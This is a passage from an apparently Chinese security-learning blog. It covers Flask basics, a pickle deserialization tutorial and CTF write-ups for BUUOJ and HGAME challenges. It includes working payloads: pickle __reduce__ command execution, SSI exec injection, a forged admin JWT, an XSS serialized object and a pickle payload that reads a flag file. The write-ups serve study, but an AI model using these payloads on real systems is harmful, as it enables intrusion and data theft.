&lt;/form>\n&lt;/body>\n&lt;/html>\n\n结合一下python后端来接收和保存文件\n@app.route('/uploader', methods = ['GET', 'POST'])\ndef uploader():\n   if request.method == 'POST':\n      f = request.files['file']\n      f.save(os.path.join(app.config['UPLOAD_FOLDER'],secure_filename(f.filename)))\n      return 'file uploaded successfully'\n\nFlask扩展Flask通常被称为微框架，因为核心功能包括基于Werkzeug的WSGI和路由以及基于Jinja2的模板引擎。此外，Flask框架还支持cookie和会话，以及JSON，静态文件等Web帮助程序。显然，这不足以开发完整的Web应用程序。而Flask扩展就具备这样的功能。Flask扩展为Flask框架提供了可扩展性。\n有大量的Flask扩展可用。Flask扩展是一个Python模块，它向Flask应用程序添加了特定类型的支持。Flask Extension Registry（Flask扩展注册表）是一个可用的扩展目录。可以通过pip实用程序下载所需的扩展名。\n重要的Flask扩展：\n\nFlask Mail - 为Flask应用程序提供SMTP接口\nFlask WTF - 添加WTForms的渲染和验证\nFlask SQLAlchemy - 为Flask应用程序添加SQLAlchemy支持\nFlask Sijax - Sijax的接口 - Python/jQuery库，使AJAX易于在Web应用程序中使用\n\n每种类型的扩展通常提供有关其用法的大量文档。由于扩展是一个Python模块，因此需要导入它才能使用它。Flask扩展名通常命名为flask-foo。导入的操作如下：\nfrom flask_foo import [class, function]\n\nflask 0.7后还可以使用：\nfrom flask.ext import foo\n\n对于这中用法，需要激活兼容性模块，可以用过运行flaskext_compat.py来安装：\nimport flaskext compat\nflaskext_compat.activete()\nfrom flask.etx import foo\n\n\n\n学习参考资料[1] https://www.w3cschool.cn/flask/ W3Cschool教程\n","slug":"Flask框架学习-二","date":"2021-03-01T04:07:21.000Z","categories_index":"Python学习","tags_index":"Flask","author_index":"A1andNS"},{"id":"c480346b91894d7a42d60e2db7bccc10","title":"Python之pickle库学习","content":"前言以下内容主要是基于Python3的，Python2环境下序列化的用法和以下类似，但是序列化生成的结果与Python3环境下是不同的。Python\n2的pickle内容从实例三开始。\n什么是pickle库\nPython标准库，只支持python的基本数据类型。\n\n可以处理复杂的序列化语法，序列化时，只是序列化整个序列对象，而非内存地址。\n\n\npickle模块实现了基本的数据序列化和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。所以pickle库也有两类主要接口，一个是序列化接口，一个是反序列化接口。\n如何使用pickle库要想调用pickle库，很简单。因为这是一个Python的内置库，不需要另行安装，可以直接引用。\nimport pickle\n\n而pickle的常用函数有如下几个：\npickle.dump()pickle.dump(object, file, protocol=None)\n\n\n\n\n\n\n\n\n\ndump操作方法可以将序列以二进制的形式存放在文件中，以便下次使用。\n\n必填参数 obj 表示将要封装的对象\n必填参数 file 表示 object 要写入的文件对象，file 必须以二进制模式打开，即 wb。file文件指的是.pkl后缀的pkl文件。\n可选参数 protocol 表示告知 pickle 使用的协议，支持的协议一共有5中不同的类型，即（0,1,2,3,4）。（0,1,2）对应的是python早期的版本，（3,4）则是在python3之后的版本。默认的协议是添加在 Python 3 中的协议 3。\n\npickle.load()pickle.load(file)\n\n\n\n\n\n\n\n\n\nload()操作方法可以从字节对象中读取被封装的对象\nfile文件依旧是.pkl后缀的pkl文件，并且读取也应使用rb权限，因为是二进制文件。\npickle.dumps()pickle.dumps(object)\n\n\n\n\n\n\n\n\n\ndumps()操作方法将object对象序列化并返回一个byte对象，而不是存入到文件中\npickle.loads()pickle.loads(bytes_object)\n\n\n\n\n\n\n\n\n\nloads()操作方法从字节对象中读取被封装的对象\n实例一序列化到pkl文件import pickle\n\n\ndef serialize():\n    ls = ['A1andNS', 'Alan', 'Alice']\n    f = open('test.pkl', 'wb')\n    pickle.dump(ls, f)\n    f.close()\n\n\nif __name__ == \"__main__\":\n    serialize()\n\n运行后在同目录下生成了一个test.pkl文件，这就是完成了一个序列化的操作。pkl文件中的二进制序列化对象，可读型是很差的。\n\n下面我们试着反序列化。\n从pkl文件反序列化import pickle\n\n\ndef unserialize():\n    f = open('test.pkl', 'rb')\n    test = pickle.load(f)\n    print(test)\n\n\nif __name__ == \"__main__\":\n    unserialize()\n\n\n成功反序列化回原来的list类型数据。\n实例二序列化到二进制字符import pickle\n\n\ndef serialize():\n    ls = ['A1andNS', 'Alan', 'Alice']\n    data = pickle.dumps(ls)\n    print(data)\n\n\nif __name__ == \"__main__\":\n    serialize()\n\n运行结果，得到一个byte类型的数据。\n\n我们现在来尝试反序列化：\n二进制字符反序列化import pickle\n\n\ndef unserialize():\n    data = b'\\x80\\x04\\x95\\x1e\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(\\x8c\\x07A1andNS\\x94\\x8c\\x04Alan\\x94\\x8c\\x05Alice\\x94e.'\n    ls = pickle.loads(data)\n    print(ls)\n\n\nif __name__ == \"__main__\":\n    unserialize()\n\n\n也可以成功的反序列化回到list类型，但是如果是从外部接收输入会怎么样呢？\nimport pickle\n\n\ndef unserialize():\n    data = eval(input(\"please enter your data:\"))\n    ls = pickle.loads(data)\n    print(ls)\n\n\nif __name__ == \"__main__\":\n    unserialize()\n\n这里有一个问题是input接收的数据是str类型，所以使用eval()来进行自动类型转换，就可以实现数据变成bytes类型了。\n我们从键盘输入二进制数据：\nb&#39;\\x80\\x04\\x95\\x1e\\x00\\x00\\x00\\x00\\x00\\x00\\x00]\\x94(\\x8c\\x07A1andNS\\x94\\x8c\\x04Alan\\x94\\x8c\\x05Alice\\x94e.&#39;\n\n\n这样就成功实现了反序列化，但是这里的例子很简单，使用了eval()，而且没有对用户输入做任何过滤，如果这样编写这个程序，就可能会导致一个RCE问题，所以一般情况下input接收的数据是需要进行过滤的。\n例如使用这个语句调用os库的system函数执行系统命令__import__(&#39;os&#39;).system(&#39;dir&#39;)\n\n实例三下面来看看Python2环境下的pickle。首先的一个不同就是在py2中序列化后结果是str类型，而不是py3的bytes类型。\n序列化到pkl文件import pickle\n\n\ndef serialize():\n    ls = ['A1andNS', 'Alan', 'Alice']\n    f = open('test.pkl', 'w')\n    pickle.dump(ls, f)\n    f.close()\n\n\nif __name__ == \"__main__\":\n    serialize()\n\n这里文件权限只要用w就好了，因为str类型的原因，它已经不是一个二进制文件了。\n\n这样我们就生成了一个序列化文件test.pkl，下面我们来对这个pkl文件进行反序列化操作。\n从pkl文件反序列化import pickle\n\n\ndef unserialize():\n    f = open('test.pkl', 'r')\n    test = pickle.load(f)\n    print(test)\n\n\nif __name__ == \"__main__\":\n    unserialize()\n\n所以对应的读权限也只要使用r就可以了，也是可以成功进行的反序列化的。\n\n实例四序列化到字符串import pickle\nimport urllib\n\n\ndef serialize():\n    ls = ['A1andNS', 'Alan', 'Alice']\n    data = pickle.dumps(ls)\n    print data\n    print urllib.quote(data)\n\n\nif __name__ == \"__main__\":\n    serialize()\n\n所以我们可以得到序列化后的str类型数据：\n(lp0\nS&#39;A1andNS&#39;\np1\naS&#39;Alan&#39;\np2\naS&#39;Alice&#39;\np3\na.\n\n编码后：\n%28lp0%0AS%27A1andNS%27%0Ap1%0AaS%27Alan%27%0Ap2%0AaS%27Alice%27%0Ap3%0Aa.\n\n可以明显发现python2的序列化结果和python3的序列化结果是不同的，为了方便使用，一般可以会对其进行编码，例如urllib.quote()等\n从字符串反序列化import pickle\nimport urllib\n\ndef unserialize():\n    data = '%28lp0%0AS%27A1andNS%27%0Ap1%0AaS%27Alan%27%0Ap2%0AaS%27Alice%27%0Ap3%0Aa.'\n    ls = pickle.loads(urllib.unquote(data))\n    print(ls)\n\n\nif __name__ == \"__main__\":\n    unserialize()\n\n\n成功进行了反序列化操作，回到了原来的list类型。\n同样的那么如果是从键盘接收数据呢，这里在py2下方便了不少，因为input接收的是str类型，刚好pickle序列化后也是str类型，所以就避免了类型转换的问题了。\nimport pickle\nimport urllib\n\n\ndef unserialize():\n    data = raw_input('please enter your data:')\n    ls = pickle.loads(urllib.unquote(data))\n    print(ls)\n\n\nif __name__ == \"__main__\":\n    unserialize()\n\n这里要使用raw_input()函数来接收数据，因为input()在python2中只接受变量作为传入值，非变量内容会报错。\n\n再次成功实现了反序列化操作。\n魔术方法这里简单介绍一种常用的魔术方法，以下内容使用Python3进行说明\n__reduce____reduce__魔术方法上出现反序列化漏洞，和PHP的__wakeup魔术方法类似，都是在反序列化开始或结束时，自动调用这类的函数，并且一般会在内部将解析出来的结构去执行一下，所以可以导致出现RCE等问题。当 __reduce__()函数返回一个元组时 , 第一个元素是一个可调用对象 , 这个对象会在创建对象时被调用 . 第二个元素是可调用对象的参数 , 同样是一个元组。\n首先生成一个序列化的bytes变量：\nimport pickle\nimport os\n\n\nclass Payload(object):\n    def __reduce__(self):\n        cmd = 'dir'\n        return os.system, (cmd,)\n\n\na = Payload()\ns = pickle.dumps(a)\nprint(s)\n\n'''运行结果'''\nb'\\x80\\x04\\x95\\x1b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02nt\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x03dir\\x94\\x85\\x94R\\x94.'\n\n这里我们在__reduce__里return了一个二元组(os.system,(cmd,),)，这里最外的可以省略，就变成了脚本中的os.system,(cmd,)，正如前面说的，这里的os.system就是第一个元组参数，即被调用函数。而(cmd,)则是第二个参数，即被调用函数的参数。最后解析结果是os.system(“dir”)。接下来我们对它进行一个反序列化操作，看看__reduce__被触发时，会发生什么。\nimport pickle\n\n\ndef unserialize():\n    data = eval(input('please enter your data:'))\n    ls = pickle.loads(data)\n    return ls\n\n\nif __name__ == \"__main__\":\n    unserialize()\n\n\n正如我们预计的确实是成功进行了命令执行。但是这里又一个问题必须要注意，os.system 调用系统命令，完成后退出，返回结果是命令执行状态，一般是0 os.popen() 无法读取程序执行的返回值。如果是作为网页后端，os.system和os.popen执行命令只有在配合print时才可以正常输出内容，如何时return与之配合将会没有回显。这时候就可以尝试使用commands.getoutput()函数来进行替换，构造payload去执行命令，用法和os.system和os.popen一样。这里就不演示了，可以去BUUOJ上做一下[CISCN2019 华北赛区 Day1 Web2]iku这题，这题的反序列化就很好的体现了这一点。\n参考材料[1] https://xz.aliyun.com/t/2289#toc-2\n[2] https://zhuanlan.zhihu.com/p/25981037\n[3] https://www.freebuf.com/articles/web/252189.html\n","slug":"Python之pickle库学习","date":"2021-02-03T01:23:23.000Z","categories_index":"Python学习","tags_index":"Python,pickle","author_index":"A1andNS"},{"id":"5b5f4ff7be54bdec87cb56e0a7ffce00","title":"BUUOJ刷题二月第一周","content":"[BJDCTF2020]EasySearch考点：SSI注入\n直接简单试一试，都是failed，所以使用dirsearch去进行目录扫描，得到一个index.php.swp获取源码。\n&lt;?php\n\tob_start();\n\t//加密hash，原文位唯一ID+随机字符(xxxxx)\n\tfunction get_hash()&#123;\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random; //uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。\n\t\treturn sha1($content); \n\t&#125;\n\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    &#123;\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) &#123;\n            echo \"&lt;script>alert('[+] Welcome to manage system')&lt;/script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            &lt;h1>Hello,'.$_POST['username'].'&lt;/h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        &#125; else &#123;\n            echo \"&lt;script>alert('[!] Failed')&lt;/script>\";\n            \n    &#125;else\n    &#123;\n\t***\n    &#125;\n\t***\n?>\n\npassword的md5值的前6位是6d0bc1,写个脚本爆破一下密码。\n&lt;?php\nfor ($i=0;$i&lt;99999999;$i++)\n&#123;\n    $a = substr(md5($i),0,6);\n    if ($a ==\"6d0bc1\")&#123;\n        $code = $i;\n        echo $code.\"\\n\";\n        break;\n    &#125;\n&#125;\n\n爆破出密码为2020666，登陆后会生成一个shtml文件，什么是shtml文件呢。\n\n\n\n\n\n\n\n\n\nshtml是标准通用标记语言下的一个应用，包含有嵌入式服务器方包含命令的文本，在被传送给浏览器之前，服务器会对SHTML文档进行完全地读取、分析以及修改。\n有叫做服务器端包含，Server side include。\n1．显示服务器端环境变量&lt;#echo&gt;\n2．将文本内容直接插入到文档中&lt;#include&gt;\n3．显示WEB文档相关信息&lt;#flastmod #fsize&gt; (如文件制作日期/大小等)\n4．直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)\n5．设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式) 高级SSI可设置变量使用if条件语句。\n所以我们可以利用username处来传入代码，进行代码注入，从而执行命令或读取文件。\n&lt;! #include virtual&#x3D;&quot;&#x2F;etc&#x2F;passwd&quot;–&gt;\n\n发现被过滤了，换一个命令执行看看。\n&lt;! #exec cmd&#x3D;&quot;ls&quot;--&gt;\n\n执行成功，得到当前目录下的文件\n\n修改命令问ls /，发现根目录下没有flag，那就看看webroot吧\n发现了flag相关信息。\nusername&#x3D;&lt;!--#exec cmd&#x3D;&quot;cat &#x2F;var&#x2F;www&#x2F;html&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password&#x3D;2020666\n\n\n得到flag。\n相关知识：\nSSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。\n\nSSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。\n\n从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。\n\n[BJDCTF 2nd]xss之光考点：git泄露\n进去什么都没有，只能使用dirsearch目录扫描，从而发现存在git泄露，使用githack抓取git目录。\n\nindex.php:\n&lt;?php\n$a = $_GET['yds_is_so_beautiful'];\necho unserialize($a);\n\n反序列化问题，但是没有类信息啊。后来看了WP，提供了一中思路，再这种情况下可以考虑使用内置类。随便试试看吧，经过测试我们序列化的字符串会被反序列化然后嵌入网页。从常规的反序列化角度来看，echo一个对象，这是会触发_toString方法的。所以最好是找个有_toString的类，一般常用的内置类是Error类和Exception类。Error类是只适用与php7，而Exception类适用与php5和php7。\n&lt;?php\n$a = new Exception('&lt;script>alert(document.cookie)&lt;/script>');\n# $a = '&lt;script>alert(document.cookie)&lt;/script>';\n$a = urlencode(serialize($a));\nvar_dump($a);\n?>\n\n\n没有发现flag。换一个window.location.href=’http://www.baidu.com&#39;\n使用网页跳转的script脚本，就成功获得了flag。\n\n[CISCN2019 华北赛区 Day1 Web2]ikun考点：pickle反序列化、jwt伪造cookie\n先看看首页源码，看看都有哪些路由，/,/login,/register等\n并且题目说脑洞大，给了一些hint，ikun们冲鸭,一定要买到lv6!!!\n点击下一页就会传入page不断++，而且page很大到了100都还存在，lv主要是体现在商品图片的名称，图片是什么对应的名称也是什么。那么写个脚本遍历一个page看看，lv6在哪里。\nimport requests\n\n\ndef find_lv6():\n    url = \"http://ca08947c-1d43-4954-9ea1-32d3f5b99dea.node3.buuoj.cn/shop?page=\"\n    for i in range(1000):\n        print(url+str(i))\n        r = requests.get(url+str(i))\n        r.encoding = r.apparent_encoding\n        if \"lv6.png\" in r.text:\n            print(i)\n            break\n\n\nif __name__ == \"__main__\":\n    find_lv6()\n\n爆破出page=181时出现lv6，可惜我们只有10快钱，买不起啊。抓包看看，修改price没有成功，发现一个有趣的参数discount也就是折扣，默认是8折，修改它试试。\n\n成功购买到了lv6，是一个重定向到路由/b1g_m4mber\n访问一下，发现页面子允许admin访问。可以发现cookie里面又jwt，去jwt.io网站看看能不能伪造cookie，绕过身份认证。\n\n首先使用jwtcrack去进行爆破密钥，得到密码是1Kun\n\n然后jwt.io网站伪造cookie。\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo\n\n访问成功。\n\n查看前端源码\n\n发现了源码文件，全局搜索pickle，在admin.py文件中看到了一个pickle.loads()的反序列化\n\n在刚才的一键成为大会员处，就存在一个Post传入become参数的点，应该就是存在反序列化的点：\n\nimport pickle\nimport urllib\n\n\nclass Payload(object):\n    def __reduce__(self):\n        return (eval, (\"open('/flag.txt', 'r').read()\",))\n\n\na = pickle.dumps(Payload())\na = urllib.quote(a)\nprint(a)\n\n\n注意一点，我们通过查看源码，可以判断出程序是基于python2的，由于python3和python2的不兼容，序列化后的结果也是不同的，所以应该使用python2来执行脚本生成payload。\nc__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%20%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\n\n修改become为我们的payload：\n\n[GYCTF2020]FlaskApp考点：\n通过报错信息，我们可以看到部分程序源码，源码路径是/app/app.py：\n@app.route('/decode',methods=['POST','GET'])\ndef decode():\n    if request.values.get('text') :\n        text = request.values.get(\"text\")\n        text_decode = base64.b64decode(text.encode())\n        tmp = \"结果 ： &#123;0&#125;\".format(text_decode.decode())\n        if waf(tmp) :\n            flash(\"no no no !!\")\n            return redirect(url_for('decode'))\n        res =  render_template_string(tmp)\n        flash( res )\n        return redirect(url_for('decode'))\n \n    else :\n        text = \"\"\n\n\n","slug":"BUUOJ刷题二月第一周","date":"2021-02-01T12:31:38.000Z","categories_index":"CTF","tags_index":"BUUOJ","author_index":"A1andNS"},{"id":"c9ebdc7b707001d9ef85b7974ab1c1e5","title":"HGAME2021部分","content":"WEBHitchhiking_in_the_Galaxy考点：HTTP头部信息\n访问HitchhikerGuide.php，修改访问模式为POST，修改UA为Infinite Improbability Drive，修改Referer为https://cardinal.ink/，再设置xxf为127.0.0.1\n​    hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!}\n智商检测鸡考点：脚本编写\n首先查看js脚本，发现几个路由的存在/api/getQuestion，/api/verify，/api/getFlag，/api/status\nfunction getStatus()&#123;\n    $.ajax(&#123;\n        type:\"GET\",\n        url: \"/api/getStatus\",\n        dataType:\"json\",\n        success:function(data)&#123;\n            let solving = data['solving']\n            $(\"#status\").text(solving);\n            if(solving === 100)\n                getFlag();\n        &#125;\n    &#125;);\n&#125;\n\nfunction getQuestion()&#123;\n    $.ajax(&#123;\n        type: \"GET\",\n        url: \"/api/getQuestion\",\n        dataType: \"json\",\n        xhrFields: &#123;\n            withCredentials: true\n        &#125;,\n        crossDomain: true,\n        success:function(data)&#123;\n            $('#integral').html(data['question']);\n        &#125;\n    &#125;);\n&#125;\n\nfunction getFlag()&#123;\n    $.ajax(&#123;\n        type: \"GET\",\n        url: \"/api/getFlag\",\n        dataType: \"json\",\n        success:function(data)&#123;\n            $('#flag').html(data['flag']);\n        &#125;\n    &#125;);\n&#125;\n\nfunction init()&#123;\n    getQuestion();\n    getStatus();\n&#125;\n\nfunction submit()&#123;\n    $.ajax(&#123;\n    type: \"POST\",\n    url: \"/api/verify\",\n    data: JSON.stringify(&#123;answer:parseFloat($('#answer').val())&#125;),\n    dataType: \"json\",\n    contentType: \"application/json;charset=utf-8\",\n    xhrFields: &#123;\n        withCredentials: true\n    &#125;,\n    crossDomain: true,\n    success: function(data) &#123;\n        console.log(data);\n        if (data['result'] === true) &#123;\n            init();\n            $('#alert').html(`\n                &lt;div class=\"alert alert-success\">\\n\n                    &lt;strong>Right!&lt;/strong>\\n\n                &lt;/div>`)\n        &#125; else &#123;\n            $('#alert').html(`\n                &lt;div class=\"alert alert-danger\">\\n\n                    &lt;strong>Wrong!&lt;/strong>\\n\n                &lt;/div>`)\n        &#125;\n    &#125;\n&#125;);\n&#125;\n\n寻找网页规律，发现cookie是没过一关就会更新，自己写了一个来拿flag脚本：\nimport requests\nfrom bs4 import BeautifulSoup\nfrom sympy import *\n\nCookie = &#123;'session': 'eyJzb2x2aW5nIjoyfQ.YBbSaQ.ju02TXjL-IyCNrnBDQE_4pLZsQA'&#125; # 这里是第一次的cookie\n\n\ndef fun(a, b, x):\n    return a * x + b\n\n\ndef math(a, b, low, up):\n    x = symbols(\"x\")\n    return integrate(fun(a, b, x), (x, low, up))\n\n\ndef get_html(Cookie=Cookie):\n    url = \"http://r4u.top:5000/api/getQuestion\"\n    r = requests.get(url, cookies=Cookie)\n    r.encoding = \"utf-8\"\n    # print(r.text)\n    return r.text\n\n\ndef find_head(soup, num):\n    msubsup = soup.find('msubsup')\n    mrows = msubsup.find_all(\"mrow\")\n    # print(mrows)\n    mo = mrows[num].find(\"mo\")\n    mn = mrows[num].find(\"mn\")\n    if mo:\n        return (int(mn.string) * -1)\n    else:\n        return (int(mn.string))\n\n\ndef find_ab(soup, num):\n    mrows = soup.find_all(\"mrow\")\n    # print(mrows[0])\n    mns = mrows[0].find_all(\"mn\")\n    # print(mns[num].string)\n    mn = eval(mns[num].string)\n    return mn\n\n\ndef submit_answer(result, Cookie=Cookie):\n    submit_url = \"http://r4u.top:5000/api/verify\"\n    json = &#123;\"answer\": result&#125;\n    try:\n        ra = requests.post(url=submit_url, cookies=Cookie, json=json)\n        print(ra.status_code)\n        ra.encoding = \"utf-8\"\n        ra.raise_for_status()\n        ls = ra.headers['Set-Cookie'].split(\";\")\n        value = ls[0].split(\"=\")\n        Cookie['session'] = value[1]\n        print(Cookie)\n    except:\n        return \"访问错误\"\n\n\ndef get_flag(Cookie=Cookie):\n    url = \"http://r4u.top:5000/api/getFlag\"\n    r = requests.get(url, cookies=Cookie)\n    r.encoding = \"utf-8\"\n    # print(r.text)\n    return r.text\n\n\nif __name__ == \"__main__\":\n    for i in range(99):\n        html = get_html()\n        soup = BeautifulSoup(html, \"html.parser\")\n        low = find_head(soup, 0)\n        up = find_head(soup, 1)\n        # print(low,up)\n        b = find_ab(soup, 3)\n        a = find_ab(soup, 2)\n        print(a, b)\n        result = str(math(a, b, low, up))\n        result = '&#123;:.2f&#125;'.format(eval(result))\n        submit_answer(result)\n    print(get_flag())\n\nhgame{3very0ne_H4tes_Math}\nwatermelon考点：代码审计\n合成大西瓜，nonono，我可不擅长这个游戏，看看网站结构：\n关键应该就在于这个project.js的文件，进入查看源码，搜索alert，一般都是过关弹出flag，成功定位到了window.atob()，这是一个用来解base64的方法，那么就base64解一下里面的内容就可以得到flag\nhgame{do_you_know_cocos_game?}\nArknights考点：git泄露、PHP反序列化\n首先根据提示使用githack抓取git目录，对git泄露的源码进行代码审计。\nsimulator.php:\n&lt;?php\n\nclass Simulator&#123;\n\n    public $session;\n    public $cardsPool;\n\n    public function __construct()&#123;\n\n        $this->session = new Session();\n        if(array_key_exists(\"session\", $_COOKIE))&#123;\n            $this->session->extract($_COOKIE[\"session\"]);\n        &#125;\n\n        $this->cardsPool = new CardsPool(\"./pool.php\");\n        $this->cardsPool->init();\n    &#125;\n\n    public function draw($count)&#123;\n        $result = array();\n\n        for($i=0; $i&lt;$count; $i++)&#123;\n            $card = $this->cardsPool->draw();\n\n            if($card[\"stars\"] == 6)&#123;\n                $this->session->set('', $card[\"No\"]);\n            &#125;\n\n            $result[] = $card;\n        &#125;\n\n        $this->session->save();\n\n        return $result;\n    &#125;\n\n    public function getLegendary()&#123;\n        $six = array();\n\n        $data = $this->session->getAll();\n        foreach ($data as $item) &#123;\n            $six[] = $this->cardsPool->cards[6][$item];\n        &#125;\n\n        return $six;\n    &#125;\n&#125;\n\nclass CardsPool\n&#123;\n\n    public $cards;\n    private $file;\n\n    public function __construct($filePath)\n    &#123;\n        if (file_exists($filePath)) &#123;\n            $this->file = $filePath;\n        &#125; else &#123;\n            die(\"Cards pool file doesn't exist!\");\n        &#125;\n    &#125;\n\n    public function draw()\n    &#123;\n        $rand = mt_rand(1, 100);\n        $level = 0;\n\n        if ($rand >= 1 &amp;&amp; $rand &lt;= 42) &#123;\n            $level = 3;\n        &#125; elseif ($rand >= 43 &amp;&amp; $rand &lt;= 90) &#123;\n            $level = 4;\n        &#125; elseif ($rand >= 91 &amp;&amp; $rand &lt;= 99) &#123;\n            $level = 5;\n        &#125; elseif ($rand == 100) &#123;\n            $level = 6;\n        &#125;\n\n        $rand_key = array_rand($this->cards[$level]);\n\n        return array(\n            \"stars\" => $level,\n            \"No\" => $rand_key,\n            \"card\" => $this->cards[$level][$rand_key]\n        );\n    &#125;\n\n    public function init()\n    &#123;\n        $this->cards = include($this->file);\n    &#125;\n\n    public function __toString()&#123;\n        return file_get_contents($this->file);\n    &#125;\n&#125;\n\n\nclass Session&#123;\n\n    private $sessionData;\n\n    const SECRET_KEY = \"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\";\n\n    public function __construct()&#123;&#125;\n\n    public function set($key, $value)&#123;\n        if(empty($key))&#123;\n            $this->sessionData[] = $value;\n        &#125;else&#123;\n            $this->sessionData[$key] = $value;\n        &#125;\n    &#125;\n\n    public function getAll()&#123;\n        return $this->sessionData;\n    &#125;\n\n\n    public function save()&#123;\n\n        $serialized = serialize($this->sessionData);\n        $sign = base64_encode(md5($serialized . self::SECRET_KEY));\n        $value = base64_encode($serialized) . \".\" . $sign;\n\n        setcookie(\"session\",$value);\n    &#125;\n\n\n    public function extract($session)&#123;\n\n        $sess_array = explode(\".\", $session);\n        $data = base64_decode($sess_array[0]);\n        $sign = base64_decode($sess_array[1]);\n\n        if($sign === md5($data . self::SECRET_KEY))&#123;\n            $this->sessionData = unserialize($data);\n        &#125;else&#123;\n            unset($this->sessionData);\n            die(\"Go away! You hacker!\");\n        &#125;\n    &#125;\n&#125;\n\n\nclass Eeeeeeevallllllll&#123;\n    public $msg=\"坏坏liki到此一游\";\n\n    public function __destruct()\n    &#123;\n        echo $this->msg;\n    &#125;\n&#125;\n\n\npool.php:\n&lt;?php\n\n    return array(\n        3 => array(//%42\n            array(\"star\" => \"★★★\", \"name\" => \"kokodayo~\", \"type\" => \"狙击\"),\n            array(\"star\" => \"★★★\", \"name\" => \"泡普卡\", \"type\" => \"近卫\"),\n            array(\"star\" => \"★★★\", \"name\" => \"炎熔\", \"type\" => \"术士\"),\n            array(\"star\" => \"★★★\", \"name\" => \"斑点\", \"type\" => \"重装\"),\n            array(\"star\" => \"★★★\", \"name\" => \"香草\", \"type\" => \"先锋\"),\n            array(\"star\" => \"★★★\", \"name\" => \"粉毛猛男\", \"type\" => \"医疗\"),\n            array(\"star\" => \"★★★\", \"name\" => \"翎羽\", \"type\" => \"先锋\"),\n            array(\"star\" => \"★★★\", \"name\" => \"泡普卡\", \"type\" => \"近卫\"),\n            array(\"star\" => \"★★★\", \"name\" => \"卡缇\", \"type\" => \"重装\"),\n            array(\"star\" => \"★★★\", \"name\" => \"米格鲁\", \"type\" => \"重装\"),\n            array(\"star\" => \"★★★\", \"name\" => \"安德切尔\", \"type\" => \"狙击\"),\n            array(\"star\" => \"★★★\", \"name\" => \"芙蓉\", \"type\" => \"医疗\"),\n            array(\"star\" => \"★★★\", \"name\" => \"梓兰\", \"type\" => \"特种\")\n        ),\n        4 => array(//%48\n            array(\"star\" => \"★★★★\", \"name\" => \"NTR\", \"type\" =>\"重装\"),\n            array(\"star\" => \"★★★★\", \"name\" => \"孑哥\", \"type\" =>\"特种\"),\n            array(\"star\" => \"★★★★\", \"name\" => \"流泪富婆猫猫头\", \"type\" =>\"狙击\"),\n            array(\"star\" => \"★★★★\", \"name\" => \"你滴龟神\", \"type\" =>\"重装\"),\n            array(\"star\" => \"★★★★\", \"name\" => \"某法国干员\", \"type\" =>\"先锋\"),\n            array(\"star\" => \"★★★★\", \"name\" => \"某暴力医生\", \"type\" =>\"医疗\"),\n            array(\"star\" => \"★★★★\", \"name\" => \"台词烫嘴\", \"type\" =>\"特种\"),\n            array(\"star\" => \"★★★★\", \"name\" => \"FF0\", \"type\" =>\"医疗\"),\n\n        ),\n        5 => array(//%8\n            array(\"star\" => \"★★★★★\", \"name\" => \"玫剑圣\", \"type\" => \"近卫\"),\n            array(\"star\" => \"★★★★★\", \"name\" => \"不准你休息的驴\", \"type\" => \"术士/近卫\"),\n            array(\"star\" => \"★★★★★\", \"name\" => \"德克萨斯\", \"type\" => \"先锋\"),\n            array(\"star\" => \"★★★★★\", \"name\" => \"德克萨斯做得到吗\", \"type\" => \"近卫\"),\n        ) ,\n        6 => array(//%2\n            array(\"star\" => \"★★★★★★\", \"name\" => \"r4u的女朋友夕\", \"type\" =>\"术士\"),\n            array(\"star\" => \"★★★★★★\", \"name\" => \"r4u的老婆年\", \"type\" =>\"重装\"),\n            array(\"star\" => \"★★★★★★\", \"name\" => \"花泽香菜\", \"type\" =>\"重装\"),\n            array(\"star\" => \"★★★★★★\", \"name\" => \"推王\", \"type\" =>\"先锋\"),\n            array(\"star\" => \"★★★★★★\", \"name\" => \"蒂蒂\", \"type\" =>\"近卫\"),\n            array(\"star\" => \"★★★★★★\", \"name\" => \"小羊\", \"type\" =>\"术士\"),\n            array(\"star\" => \"★★★★★★\", \"name\" => \"银老板\", \"type\" =>\"近卫\"),\n\n        )\n    );\n\nindex.php:\n&lt;?php\nerror_reporting(0);\nrequire_once (&quot;simulator.php&quot;);\n$simulator &#x3D; new Simulator();\n$cards &#x3D; array();\nif(isset($_POST[&quot;draw&quot;]))&#123;\n    $cards 